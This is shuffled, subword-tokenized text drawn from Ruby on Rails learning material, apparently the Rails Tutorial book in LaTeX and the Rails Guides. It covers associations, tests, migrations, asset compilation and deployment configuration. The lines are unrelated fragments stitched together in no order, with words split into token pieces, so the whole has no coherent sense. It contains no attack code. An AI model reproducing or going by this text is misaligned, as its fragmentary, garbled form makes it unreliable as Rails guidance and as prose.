▁S w it ch ed ▁to ▁branch ▁' master '
▁def ▁self ▖ default _ scope
▁We ▁see ▁here ▁that ▁the ▁\ k ode { nil } ▁object ▁doesn ' t ▁itself ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method , ▁but ▁\ k ode { nil ▖ to \_ s } ▁does .
▁If ▁you ▁set ▁the ▁`: auto save ` ▁option ▁to ▁` true `, ▁Rails ▁will ▁save ▁any ▁loaded ▁ member s ▁and ▁destroy ▁ member s ▁that ▁are ▁ marked ▁for ▁ destruction ▁when ever ▁you ▁save ▁the ▁ parent ▁object .
▁The ▁application ▁code ▁is ▁a ▁one - line r :
▁user name : ▁blog
▁It ▁intend s ▁to ▁prevent ▁ o d d ▁bug s ▁and ▁con f us ion ▁in ▁code ▁that ▁call ▁m u t at or ╼ methods ▁directly ▁on ▁the ▁` Relation ` .
▁ const _ name ▁= ▁path ▖ demodulize
▁That ' s ▁quite ▁a ▁lot ▁of ▁text !
▁rails ▁new ▁app name ▁-- skip - sprockets
▁t ▖ string ▁: name
▁E ar li er ▁versions ▁of ▁Rails ▁used ▁a ▁blacklist ▁approach ▁for ▁the ▁ strip _ tags () , ▁ strip _ links () ▁and ▁ sanitize () ▁method ▖
▁and ▁so ▁on .
▁The ▁` delegate ` ▁ macro ▁accept s ▁sever al ▁methods :
▁As ▁with ▁production ▁email ▁configuration ▁( Listing ~\ ref { code : sendgrid _ config }), ▁Listing ~\ ref { code : carrier _ w a ve _ configuration } ▁uses ▁Heroku ▁\ k ode { ENV } ▁variables ▁to ▁avoid ▁hard - coding ▁ sensitive ▁information .
▁Article ▖ published
▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ') ▁do ▁| format |
▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ new _ micropost - full ▖ png }{( full ▁size )}
▁Because ▁we ▁already ▁have ▁a ▁test ▁for ▁ signing ▁up ▁with ▁valid ▁information , ▁we ' ll ▁add ▁the ▁steps ▁to ▁the ▁test ▁ developed ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission } ▁( Listing ~\ ref { code : a _ test _ for _ valid _ submission }) .
▁The ▁engine ▁should ╼ only ▁be ▁ en h an c ing ▁it , ▁rather ▁than ▁changing ▁it ▁d ra s tic ally .
▁method , ▁which ▁we ▁saw ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : modify ing _ built _ in _ classes } ▖)
▁some _ k la s s ▖ acts _ like ?( : string )
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ ordering }, ▁the ▁tests ▁should ▁be ▁\ passing :
▁A lthough ▁Bootstrap ▁comes ▁with ▁CSS ▁rules ▁for ▁nice ▁ typography , ▁we ' ll ▁also ▁add ▁some ▁custom ▁rules ▁for ▁the ▁appearance ▁of ▁the ▁text ▁on ▁our ▁site , ▁as ▁show n ▁in ▁Listing ~\ ref { code : typography _ css } .
▁### ▁L a y ing ▁down ▁the ▁ gr ound ▁work
▁0 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁This ▁discussion ▁suggest s ▁ modeling ▁the ▁followed ▁users ▁as ▁in ▁Figure ~\ ref { fig : na ive _ user _ has _ many _ following }, ▁with ▁a ▁\ k ode { following } ▁table ▁and ▁a ▁\ k ode { has \_ many } ▁association .
▁when ▁' B ad ▁User '
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users } .
▁A ▁user ▁ row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development ▖ sqlite 3 } ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sqlite _ user _ row _ with _ password _4_0 - full ▖ png }{( full ▁size )}
▁### ▁Using ▁ Array / Hash ▁of ▁Name d ▁Associations
▁The ╼` author _ class ` ▁method ▁should ▁always ▁return ▁a ▁` Class ` ▁object .
▁With ▁that , ▁the ▁ friendly ▁ forwarding ▁integration ▁test ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test } ▁should ▁pass , ▁and ▁the ▁basic ▁user ▁authentication ▁and ▁page ▁ protection ▁implementation ▁is ▁complete .
▁You ▁can ▁do ▁this ▁by ▁running ▁the ╼ following ▁in ▁the ▁` blog ` ▁directory :
▁To ▁run ▁\ emph { all } ▁the ▁tests , ▁hit ▁return ▁at ▁the ▁\ k ode { guard > } ▁pro mp t .
▁( end )╼╼ \ section { Activ ating ▁the ▁account } ▁% ▁( fold )╼\ label { sec : activating _ the _ account }╼╼
▁The ▁result ▁appears ▁in ▁Figure ~\ ref { fig : signup _ failure }, ▁and ▁the ▁full ▁debug ▁information ▁( with ▁an ▁increase d ▁f on t ▁size ) ▁appears ▁in ▁Figure ~\ ref { fig : signup _ failure _ rails _ debug } .
▁string ', ▁' foo ')
▁( As ▁a ▁general ▁rule , ▁you ▁should ▁refresh ▁the ▁file ▁ tree ▁any ▁time ▁files ▁or ▁directories ▁don ' t ▁appear ▁as ▁expected ▖)
▁def ▁load _ missing _ constant ( from _ mod , ▁ const _ name )
▁in ▁Listing ~\ ref { code : relationships _ belongs _ to _ test } .
▁We ' ll ▁also ▁take ▁a ▁more ▁con c re te ▁look ▁at ▁the ▁effect s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁including ▁an ▁ ex a m in ation ▁of ▁the ▁important ▁\ k ode { authenticate } ▁method .
▁We ▁then ▁visit ▁the ▁link ▁from ▁the ▁email ▁and ▁again ▁submit ▁invalid ▁and ▁valid ▁information , ▁verify ing ▁the ▁correct ▁behavior ▁in ▁each ▁case .
▁( Remember , ▁you ▁are n ' t ▁suppose d ▁to ▁understand ▁this ▁code ▁right ▁now .
▁ force ▁config / routes ▖ rb
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2 }
▁S h o ul d ▁documentation ▁else where ▁be ▁updated ?
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial } .
▁### ▁A u to ▁encoding ▁header ▁values
▁Using ▁the ▁` find ` ▁method , ▁you ▁can ▁retrieve ▁the ▁object ▁corresponding ▁to ▁the ▁specified ▁ _ primary ▁key _ ▁that ▁matches ▁any ▁supplied ▁options ▖
▁We ▁have n ' t ▁discuss ed ▁arrays ▁yet ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁but ▁understanding ▁them ▁gives ▁a ▁good ▁foundation ▁for ▁understanding ▁hashes ▁( Section ~\ ref { sec : hashes _ and _ symbols }) ▁and ▁for ▁aspect s ▁of ▁Rails ▁data ▁ modeling ▁( such ▁as ▁the ▁\ k ode { has \_ many } ▁association ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁covered ▁more ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }) .
▁In ▁Chapter ~\ ref { cha : basic _ login }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁( The ▁call ▁to ▁\ k ode { to \_ s } ▁is ▁to ▁make ▁sure ▁we ▁can ▁handle ▁\ k ode { nil } ▁token s , ▁which ▁should n ' t ▁happen ▁in ▁browsers ▁but ▁some times ▁happens ▁in ▁tests ▖)
▁your ▁user name ▁is : ▁<%= ▁@ user ▖ login ▁%> ▖ < br >
▁</ ul >
▁For ▁our ▁purposes , ▁the ▁`` start er '' ▁t i er ▁( which ▁is ▁ limited ▁to ▁200 ▁email s ▁a ▁day ▁but ▁ cost s ▁not h ing ) ▁is ▁the ▁best ▁fit .
▁If ▁you ▁set ▁this ▁to ▁` northwest _ `, ▁then ▁the ▁ Customer ▁class ▁will ▁look ▁for ▁` northwest _ customers ` ▁as ▁its ▁table ▖
▁ Hash es , ▁in ▁contrast , ▁are ▁different .
▁To ▁get ▁the ▁tests ▁to ▁\ passing , ▁we ▁need ▁to ▁make ▁an ▁exception ▁to ▁the ▁password ▁validation ▁if ▁the ▁password ▁is ▁empty .
▁Here ' s ▁the ▁section ▁of ▁the ▁default ▁configuration ▁file ▁( ` config / database ▖ yml ` ) ▁with ▁connection ▁information ▁for ▁the ▁development ▁environment :
▁It ▁also ▁doesn ' t ▁actually ▁create ▁a ▁new ▁user .
▁ radio _ button _ tag ▁' g end er ', ▁' ma le '
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ out _ with _ test _ close _ browser }
▁This ▁will ▁generate ▁the ▁exact ▁same ▁routes ▁as ▁the ▁first ▁example ▖
▁assemblies ▖ clear
▁belongs _ to ▁: supplier
▁This ▁helper ▁validates ▁the ▁length ▁of ▁the ▁attributes ' ▁values ▖
▁* ▁Re s p on s ible ▁for ▁storing ▁the ▁session ▁in ▁cookies .
▁Setting ▁it ▁will ▁have ▁no ╼ e ffect ▁on ▁the ▁application ▖
▁\ failing ▁\ \ ▁\ file path { test / controllers / static \_ pages \_ controller \_ test ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 15 , ▁ 16 , ▁17 , ▁ 18 ] ╼\ begin { code } ╼ require ▁' test _ helper ' ╼╼ class ▁StaticPages Controller Test ▁< ▁ ActionController :: TestCase ╼╼ ▁test ▁" should ▁get ▁ home " ▁do ╼ ▁get ▁: home ╼ ▁ assert _ response ▁: success
▁Fin ally , ▁this ▁data ▁model ▁is ▁a ▁maintain ability ▁ n ight ma re : ▁each ▁time ▁a ▁user ▁changed ▁( s a y ) ▁their ▁name , ▁we ▁would ▁need ▁to ▁update ▁not ▁just ▁the ▁user ' s ▁record ▁in ▁the ▁\ k ode { users } ▁table ▁but ▁also ▁\ emph { ever y ▁ row ▁containing ▁that ▁user } ╼ in ▁both ▁the ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁table s .
▁To ▁get ▁the ▁deployment ▁to ▁work , ▁we ▁first ▁need ▁to ▁add ▁a ▁line ▁for c ing ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁has _ many ▁: comments
▁A ▁password ▁reset ▁has ▁ expired ▁if ▁the ▁time ▁inter val ▁since ▁the ▁reset ▁was ▁sent ▁is ▁ greater ▁than ▁the ▁ expiration ▁ limit :
▁# ▁The ▁result ▁could ▁either ▁be
▁It ' s ▁worth ▁emphasi z ing ▁that ▁the ▁goal ▁of ▁this ▁book ▁is ▁\ emph { not } ▁me re ly ▁to ▁teach ▁Rails , ▁but ▁rather ▁to ▁teach ▁\ emph { web ▁development ▁with ▁Rails }, ▁which ▁means ▁a c q u ir ing ▁( or ▁ expand ing ) ▁the ▁ s kill s ▁needed ▁to ▁develop ▁software ▁for ▁the ▁World ▁Wi de ▁Web .
▁( As ▁noted ▁in ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁the ▁use ▁of ▁options ▁hashes ▁is ▁a ▁re c ur r ing ▁the me ▁in ▁Rails ▖)
▁We ' ll ▁thus ▁write ▁a ▁short ▁integration ▁test ▁for ▁the ▁login ▁form ▁submission ▁before ▁proceeding .
▁Rails ▖ application ▖ config ▖ action _ dispatch ▖ cookies _ serialize r ▁= ▁: hybrid
▁For ▁more ▁on ▁the ▁ origin s ▁of ▁`` foo '' ▁and ▁`` bar '' --- and , ▁in ▁particular , ▁the ▁possible ▁\ emph { n on } - rel ation ▁of ▁`` foobar '' ▁to ▁`` F U B A R '' --- see ▁the ▁\ href { http :// www ▖ cat b ▖ org / j argon / html / F / foo ▖ html } { J argon ▁File ▁entry ▁on ▁`` foo '' } .
▁Extensions ▁to ▁` NameError `
▁else
▁# ▁ SELECT ▁D IS T IN C T ▁role ▁FROM ▁clients
▁#### # ▁` collection ( force _ reload ▁= ▁false ) `
▁Use ▁the ▁` uniq ` ▁method ▁to ▁remove ▁duplicate s ▁from ▁the ▁collection .
▁Fin ally , ▁in ▁Chapter ~\ ref { cha : user _ microposts }, ▁we ' ll ▁use ▁the ▁id entity ▁of ▁a ▁logged - in ▁user ▁to ▁create ▁microposts ▁ associated ▁with ▁that ▁user , ▁and ▁in ▁Chapter ~\ ref { cha : following _ users } ▁we ' ll ▁allow ▁the ▁current ▁user ▁to ▁follow ▁other ▁users ▁of ▁the ▁application ▁( the re by ▁re ce i v ing ▁a ▁feed ▁of ▁their ▁microposts ) .
▁* ▁` index ▖ html ▖ erb `
▁page ▁for ▁a ▁new ▁session ▁( signin )
▁" Person "▖ tableize ▁# ▁=> ▁" people "
▁The ▁worm s ▁ exploit s ▁a ▁hole ▁in ▁ Y a h oo ' s ▁HTML / JavaScript ▁filter , ▁which ▁usually ▁filter s ▁all ▁ target ▁and ▁on load ▁attributes ▁from ▁tags ▁( because ▁there ▁can ▁be ▁JavaScript )▖
▁If ▁all ▁we nt ▁well , ▁you ▁should ▁run ▁the ▁full ▁test ▁suite ▁to ▁verify ▁that ▁all ▁the ▁tests ▁are ▁\ passing :
▁def ▁ counter _ cache _ column
▁For ▁c l ar ity , ▁this ▁tutorial ▁always ▁uses ▁the ▁full ▁command , ▁but ▁in ▁real ▁ life ▁most ▁Rails ▁developers ▁use ▁one ▁or ▁more ▁of ▁the ▁ shortcuts ▁show n ▁in ▁Table ~\ ref { table : shortcuts } .
▁Client ▖ where (" orders _ count ▁= ▁? ", ▁params [: orders ])
▁template _ name : ▁' another ')
▁Note ▁here ▁that ▁a ▁ factory ▁can ▁take ▁an ▁option :
▁* ▁Use ▁` a ▁= ▁b ` ▁and ▁not ▁` a = b ` .
▁The ▁method ▁` end _ of _ day ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁day ▁( 23:59:59 ) :
▁G lo b al ID
▁ { a : ▁1, ▁b : ▁2}▖ with _ indifferent _ access ▖ s li ce (" a ")
▁ Caching ▁will ▁only ▁happen ▁if ▁ ActionController :: Base ▖ perform _ caching ▁is ▁set ▁to ▁true ▁( which ▁is ▁the ▁case ▁by ▁default ▁for ▁the ▁Rails ▁production ▁environment , ▁but ▁not ▁for ▁the ▁development ▁environment ) .
▁Client ▖ distinct ▖ pluck (: r o le )
▁c ▖ first _ name ▁= ▁' M an n y '
▁The ▁`< % ▁%> ` ▁tags ▁are ▁used ▁to ▁execute ▁Ruby ▁code ▁that ▁does ▁not ▁return ▁anything , ▁such ▁as ▁conditions , ▁ lo o p s ▁or ▁blocks , ▁and ▁the ▁` <%= ▁%> ` ▁tags ▁are ▁used ▁when ▁you ▁want ▁output .
▁HTML ▁for ▁the ▁login ▁form ▁produce d ▁by ▁Listing ~\ ref { code : login _ form } .
▁If ▁you ▁do ▁not ▁want ▁the ▁instance ▁ predicate , ▁pass ▁` instance _ predicate : ▁false ` ▁and ▁it ▁will ▁not ▁be ▁defined .
▁In ▁Rails ▁3 , ▁4 06 ▁ Not ▁A c ce p table ▁was ▁always ▁returned ▖
▁( With ▁the ▁cloud ▁IDE , ▁this ▁involve s ▁click ing ▁the ▁ ar row ▁in ▁the ▁file ▁ navigator ▁to ▁open ▁the ▁sample ▁app ▁directory ▁and ▁double - click ing ▁the ▁\ k ode { Gemfile } ▁ icon ▖)
▁ { a : ▁1 } ▖ with _ indifferent _ access ▖ except (: a ) ▁# ▁=> ▁ { }
▁Article ▖ where ▖ not ( author : ▁author )
▁$ ▁rails ▁-- version
▁* ▁` config ▖ active _ record ▖ record _ timestamp s ` ▁is ▁a ▁boolean ▁value ▁which ▁control s ▁whether ▁or ▁not ▁timestamp ing ▁of ▁` create ` ▁and ▁` update ` ▁operations ▁on ▁a ▁model ▁occur ▖
▁it ▁as k s ▁the ▁route r ▁to ▁match ▁it ▁to ▁a ▁controller ▁action ▖
▁< th ></ th >
▁Configur ing ▁the ▁application ▁to ▁use ▁SSL ▁in ▁production .
▁The ▁method ▁` instance _ value s ` ▁returns ▁a ▁hash ▁that ▁map s ▁instance ▁variable ▁names ▁without ▁" @ " ▁to ▁their ╼ c or respond ing ▁values ▖
▁ Password
▁By ▁the ▁way , ▁the ▁tests ▁take ▁some ▁time ▁to ▁start , ▁which ▁is ▁due ▁to ▁two ▁ factor s : ▁ (1) ▁starting ▁the ▁\ emph { Spring ▁server } ▁to ▁p reload ▁parts ▁of ▁the ▁Rails ▁environment , ▁which ▁only ▁happens ▁the ▁first ▁time ; ▁and ▁ (2) ▁over head ▁ associated ▁with ▁Ruby ▁start up ▁time .
▁ Class es ▁are ▁simply ▁a ▁convenient ▁way ▁to ▁ org an ize ▁\ emph { function s } ▁( also ▁called ▁\ emph { methods }) ▁like ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions , ▁which ▁are ▁defined ▁using ▁the ▁\ k ode { de f } ▁keyword .
▁Return ▁a ▁new ▁Micropost ▁object ▁(\ k ode { user \_ id ▁= ▁user ▖ id }) .
▁Now ▁that ▁we ' ve ▁created ▁the ▁actions ▁and ▁views ▁for ▁some ▁static ▁pages , ▁we ' ll ▁make ▁them ▁\ emph { slightly } ▁dynamic ▁by ▁adding ▁some ▁content ▁that ▁changes ▁on ▁a ▁per - page ▁basis : ▁we ' ll ▁have ▁the ▁title ▁of ▁each ▁page ▁change ▁to ▁reflect ▁its ▁content .
▁( Because ▁\ k ode { activation \_ token } ▁is ▁a ▁virtual ▁attribute ▁( Section ~\ ref { sec : account _ activations _ resource }), ▁the ▁user ▁from ▁the ▁database ▁doesn ' t ▁have ▁one ▖)
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ digest _ should _ not _ be _ blank }
▁-- ---
▁which ▁generates
▁The ▁default ▁error ▁message ▁for ▁` validates _ associated ` ▁is ▁_" is ▁invalid " _ ▖
▁To ▁make ▁the ▁effect s ▁of ▁\ k ode { image \_ tag } ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁it ▁produce s
▁We ▁first ▁create ▁a ▁\ k ode { password \_ reset } ▁method ▁in ▁the ▁user ▁mailer ▁( Listing ~\ ref { code : mail _ password _ reset }), ▁and ▁then ▁define ▁view ▁templates ▁for ▁plain - text ▁email ▁( Listing ~\ ref { code : password _ reset _ text }) ▁and ▁HTML ▁email ▁( Listing ~\ ref { code : password _ reset _ html }) .
▁As ▁a ▁ contributor , ▁it ' s ▁important ▁to ▁think ▁about ▁whether ▁this ▁API ▁is ▁mean t ▁for ▁end - user ▁con sum p tion ▖
▁An y ▁time ▁something ▁isn ' t ▁be having ▁as ▁expected ▁or ▁a ▁process ▁appears ▁to ▁be ▁f r o z en , ▁it ' s ▁a ▁good ▁idea ▁to ▁run ▁\ text tt { p s ▁aux } ▁to ▁see ▁what ' s ▁going ▁on , ▁and ▁then ▁run ▁\ text tt { kill ▁- 9 ▁< p id > } ▁or ▁\ text tt { p kill ▁- 9 ▁- f ▁< name > } ▁to ▁clear ▁things ▁up .
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar val ▁form ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁ sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁then ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁upload ed ▁images ) .
▁* ▁` collection ▖ empty ?
▁In ▁the ▁final ▁two ▁examples , ▁the ▁block ▁inside ▁\ k ode { map } ▁involve s ▁calling ▁a ▁particular ▁method ▁on ▁the ▁block ▁variable , ▁and ▁in ▁this ▁case ▁there ' s ▁a ▁common ly ▁used ▁shorthand :
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : mailer _ template s } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁On ▁the ▁first ▁request ▁the ▁assets ▁are ▁ compiled ▁and ▁cached ▁as ▁out line d ▁in ╼ development ▁above , ▁and ▁the ▁manifest ▁names ▁used ▁in ▁the ▁helpers ▁are ▁alter ed ▁to ╼ include ▁the ▁M D 5 ▁hash .
▁The ▁default ▁value ▁is ▁design ed ▁for ▁security , ▁not ▁for ▁ speed , ▁which ▁is ▁ perfect ▁for ▁production ▁applications , ▁but ▁in ▁tests ▁our ▁needs ▁are ▁ reverse d : ▁we ▁want ▁\ emph { fast } ▁tests , ▁and ▁don ' t ▁care ▁at ▁all ▁about ▁the ▁security ▁of ▁the ▁test ▁users ' ▁password ▁hashes .
▁as ▁show n ▁in ▁Listing ~\ ref { code : updated _ error _ messages _ partial } .
▁ Util ity ▁methods ▁for ▁following ▖
▁# ▁the ▁ seed , ▁which ▁is ▁ print ed ▁after ▁each ▁run .
▁Let ' s ▁see ▁how ▁to ▁load ▁its ▁definition .
▁When ▁`: instance _ reader ` ▁is ▁` false `, ▁the ▁instance ▁ predicate ▁returns ▁a ▁` NoMethodError ` ▁just ▁like ▁the ▁reader ▁method .
▁# ▁2▖ even ?
▁There ▁are ▁a ▁number ▁of ▁settings ▁available ▁on ▁` config ▖ action _ mailer `:
▁By ╼ default ▁ ▖ coffee ▁and ▁ ▖ scss ▁files ▁will ▁not ▁be ▁ precompile d ▁on ▁their ▁own ▖
▁Rails ▁will ▁first ▁look ▁for ▁this ▁template ▖
▁Rails ▁supports ▁ s i x ▁types ▁of ▁associations :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / k ernel / re port ing ▖ rb ` .
▁( We ' ll ▁start ▁creating ▁our ▁own ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▖)
▁De ve lo ped ▁over ▁the ▁course ▁of ▁build ing ▁an ▁application , ▁the ▁result ing ▁\ emph { test ▁suite } ▁serve s ▁as ▁a ▁ safety ▁ net ▁and ▁as ▁execut able ▁documentation ▁of ▁the ▁application ▁source ▁code .
▁N est ed ▁hashes .
▁# ▁Re p la ce ▁with ▁code ▁to ▁make ▁a ▁user ▁variable
▁ Adding ▁in ▁assertions ▁for ▁the ▁right ▁links ▁yields ▁the ▁tests ▁show n ▁in ▁Listing ~\ ref { code : following _ tests } .
▁Pass en g er ▁make s ▁it ▁easy ▁to ▁run ▁your ▁application ▁in ▁a ▁sub directory ▖
▁$ (' # logo ')▖ attr ▁src : ▁" <%= ▁asset _ path (' logo ▖ png ') ▁%> "
▁To ▁find ▁the ▁current ▁layout , ▁Rails ▁first ▁look s ▁for ▁a ▁file ▁in ▁` app / views / layouts ` ▁with ▁the ▁same ▁base ▁name ▁as ▁the ▁controller ▖
▁NOTE : ▁If ▁you ▁want ▁to ▁make ▁the ▁format ▁segment ▁m and a to ry , ▁so ▁it ▁cannot ▁be ▁omitted , ▁you ▁can ▁supply ▁` format : ▁true ` ▁like ▁this :
▁use ▁ ActionDispatch :: ShowExceptions
▁A ▁`: no doc : ` ▁should ▁ never ▁be ▁added ▁simply ▁because ▁a ▁method ▁or ▁class ▁is ▁missing ▁documentation ▖
▁location ▁ ~ ▁ ^ / assets / ▁ {
▁` try ` ▁can ▁also ▁be ▁called ▁without ▁arguments ▁but ▁a ▁block , ▁which ▁will ▁only ▁be ▁executed ▁if ▁the ▁object ▁is ▁not ▁nil :
▁Active ▁Support ▁extend s ▁this ▁API ▁to ▁be ▁able ▁to ▁pass ╼ relative ▁ qualified ▁constant ▁names .
▁redirect _ to ▁action : ▁' read _ cookie '
▁--------- --------------- ----------------
▁In ▁particular , ▁\ k ode { count } ▁does ▁\ emph { not } ▁pull ▁all ▁the ▁microposts ▁out ▁of ▁the ▁database ▁and ▁then ▁call ▁\ k ode { length } ▁on ▁the ▁result ing ▁array , ▁as ▁this ▁would ▁become ▁in efficient ▁as ▁the ▁number ▁of ▁microposts ▁g re w .
▁What ▁are ▁engines ?
▁A ▁test ▁to ▁ensure ▁that ▁the ▁\ k ode { user \_ id } ▁isn ' t ▁ accessible .
▁### ▁The ▁` has _ and _ belongs _ to _ many ` ▁Association
▁If ▁you ▁have ▁no ▁p ri or ▁experience ▁with ▁Ruby , ▁you ▁will ▁find ▁a ▁very ▁ st eep ▁learning ╼ c ur ve ▁ div ing ▁ str a ight ▁into ▁Rails ▖
▁to ▁associate ▁a ▁micropost ▁with ▁a ▁given ▁user .
▁* ▁` config ▖ action _ controller ▖ permit _ all _ parameters ` ▁set s ▁all ▁the ▁parameters ▁for ▁ mass ▁assignment ▁to ▁be ▁ permitted ▁by ▁default ▖
▁# ▁En able ▁parameter ▁wrap p ing ▁for ▁JSON ▖ ▁You ▁can ▁disable ▁this ▁by ▁setting ▁: format ▁to ▁an ▁empty ▁array .
▁Before ▁mov ing ▁on , ▁we ' ll ▁add ▁a ▁couple ▁of ▁Relationship ▁model ▁validations ▁for ▁completeness .
▁I ▁shall ▁be ▁late !" ▖ truncate ( 20 , ▁omission : ▁' & hell ip ; ')
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁You ▁can ▁use ▁ initializers ▁to ▁hold ▁configuration ▁settings ▁that ▁should ▁be ▁made ▁after ▁all ▁of ▁the ▁framework s ▁and ▁gems ▁are ▁loaded , ▁such ▁as ▁options ▁to ▁configure ▁settings ▁for ▁these ▁parts .
▁Return s ▁the ▁character ▁of ▁the ▁string ▁at ▁position ▁` position `:
▁We ' ve ▁already ▁seen ▁how ▁Capybara ▁supports ▁an ▁in t u i tive ▁web - nav ig ation ▁syntax .
▁the ▁user ▁does ▁not ▁need ▁to ▁know ▁which ▁is ▁the ▁actual ▁default ▁value ▁of ▁the ▁flag ,╼ and ▁so ▁we ▁only ▁document ▁its ▁boolean ▁ se man tic s .
▁=> ▁false
▁P o s s ible ▁values ▁are : < ul >
▁The ▁` collection = ` ▁method ▁make s ▁the ▁collection ▁contain ▁only ▁the ▁supplied ▁objects , ▁by ▁adding ▁and ▁ deleting ▁as ▁appropriate .
▁With ▁RSpec ▁and ▁Capybara , ▁we ▁will ▁be ▁able ▁to ▁write ▁express ive ▁tests ▁to ▁automate ▁task s ▁that ▁used ▁to ▁have ▁to ▁be ▁done ▁by ▁hand .
▁By ▁the ▁way , ▁there ▁actually ▁exists ▁a ▁full ▁ regex ▁for ▁matching ▁email ▁addresses ▁according ▁to ▁the ▁of ficial ▁standard , ▁but ▁it ' s ▁really ▁not ▁worth ▁the ▁trouble .
▁#### ▁JSON ▁gem ▁ compatibility
▁The ▁following ▁methods ▁trigger ▁validations , ▁and ▁will ▁save ▁the ▁object ▁to ▁the ╼ database ▁only ▁if ▁the ▁object ▁is ▁valid :
▁With out ▁this ▁file , ▁the ▁confirmation ▁di a log ▁ box ▁would n ' t ▁appear .
▁module ▁N
▁You ▁can ▁read ▁more ▁about ▁the ▁Rails ▁In ter n ation a li z ation ▁( I 18 n ) ▁API ▁[ her e ]( i 18 n ▖ html ) .
▁| ▁------- ---------------- ▁| ▁- ---------------- ---------------- ---------------- ---------------- ---------------- ▁|
▁The ▁asset ▁pipeline ▁provides ▁a ▁framework ▁to ▁concatenate ▁and ▁ mini fy ▁or ▁ compress ╼ JavaScript ▁and ▁CSS ▁assets ▖
▁The ▁About ▁page ▁at ▁\ href { http ://0▖0▖0▖0:3000/ about }{/ about } .
▁This ▁would ▁generate ▁a ▁query ▁which ▁contains ▁a ▁` LE F T ▁ OUT ER ▁JOIN ` ▁whereas ▁the ╼` joins ` ▁method ▁would ▁generate ▁one ▁using ▁the ▁` INNER ▁JOIN ` ▁function ▁instead .
▁( S ince ▁Ruby ▁filename s ▁typical ly ▁use ▁ s na k e ▁case , ▁the ▁Rails ▁generator ▁convert s ▁ CamelCase ▁to ▁ s na k e ▁case ▁using ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / classes / ActiveSupport / In f le c to r ▖ html # method - i - underscore }{\ text tt { underscore } } ▁method ▖)
▁Similar ly , ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁we ' ll ▁generate ▁a ▁\ emph { model } ▁as ▁follows :
▁Now ▁instead ▁of ▁the ▁ugly ▁Ruby ▁object ▁output , ▁the ▁author ' s ▁name ▁will ▁be ▁displayed .
▁> > ▁p ▖ new _ record ?
▁The ▁key ▁is ▁to ▁check ▁all ▁three ▁requirements ▁for ▁the ▁feed : ▁microposts ▁for ▁followed ▁users ▁and ▁the ▁user ▁itself ▁should ▁be ▁included ▁in ▁the ▁feed , ▁but ▁a ▁post ▁from ▁an ▁\ emph { unfollow ed } ▁user ▁should ▁not ▁be ▁included .
▁The ▁User ▁model ▁with ▁added ▁account ▁activation ▁attributes .
▁ / application ▖ ( css | js ) $ / ▁ ]
▁The ▁query ▁string ▁strategy ▁has ▁sever al ▁di s ad v an tag es :
▁In ▁Section ~\ ref { sec : email _ in _ production }, ▁these ▁variables ▁were ▁defined ▁automatically ▁via ▁the ▁ SendGrid ▁add - on , ▁but ▁in ▁this ▁case ▁we ▁need ▁to ▁define ▁them ▁explicitly , ▁which ▁we ▁can ▁accomplish ▁using ▁\ k ode { heroku ▁config : set } ▁as ▁follows :
▁The ▁ directive s ▁that ▁work ▁in ▁JavaScript ▁files ▁also ▁work ▁in ▁stylesheets ╼ ( t hough ▁obvious ly ▁including ▁stylesheets ▁rather ▁than ▁JavaScript ▁files )▖
▁A ▁mockup ▁of ▁the ▁ proto - feed ▁with ▁micropost ▁delete ▁links .
▁### ▁ Overriding ▁the ▁Name d ▁ Helpers
▁ ╼ ▁* = ▁require _ self
